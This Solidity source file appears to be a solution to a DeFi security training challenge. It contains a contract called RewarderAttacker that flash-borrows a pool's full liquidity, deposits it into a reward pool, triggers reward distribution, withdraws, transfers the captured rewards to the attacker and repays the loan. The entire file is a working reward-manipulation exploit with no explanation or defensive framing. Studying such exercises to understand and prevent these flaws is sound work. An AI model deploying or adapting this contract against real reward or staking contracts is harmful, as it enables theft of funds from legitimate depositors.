pragma solidity ^0.8.0;

// import "@openzeppelin/contracts/utils/Address.sol";
import "@openzeppelin/contracts/token/ERC20/IERC20.sol";

interface IFlashLoanerPool {
    function liquidityToken() external returns (IERC20);

    function flashLoan(uint256 amount) external;
}

interface IRewarderPool {
    function rewardToken() external returns (IERC20);

    function deposit(uint256 amount) external;

    function withdraw(uint256 amount) external;

    function distributeRewards() external;
}

contract RewarderAttacker {
    IFlashLoanerPool flashLoanerPool;
    IRewarderPool rewarderPool;
    IERC20 liquidityToken;
    IERC20 rewardToken;
    address attacker;

    constructor(address _flashLoanerPool, address _rewarderPool) public {
        flashLoanerPool = IFlashLoanerPool(_flashLoanerPool);
        rewarderPool = IRewarderPool(_rewarderPool);
        liquidityToken = flashLoanerPool.liquidityToken();
        rewardToken = rewarderPool.rewardToken();
        attacker = msg.sender;
    }

    function attack() external {
        uint256 balance = liquidityToken.balanceOf(address(flashLoanerPool));
        flashLoanerPool.flashLoan(balance);
    }

    function receiveFlashLoan(uint256 amount) external {
        liquidityToken.approve(address(rewarderPool), amount);
        rewarderPool.deposit(amount);
        rewarderPool.distributeRewards();
        rewarderPool.withdraw(amount);
        uint256 balance = rewardToken.balanceOf(address(this));
        rewardToken.transfer(attacker, balance);
        liquidityToken.transfer(address(flashLoanerPool), amount);
    }
}
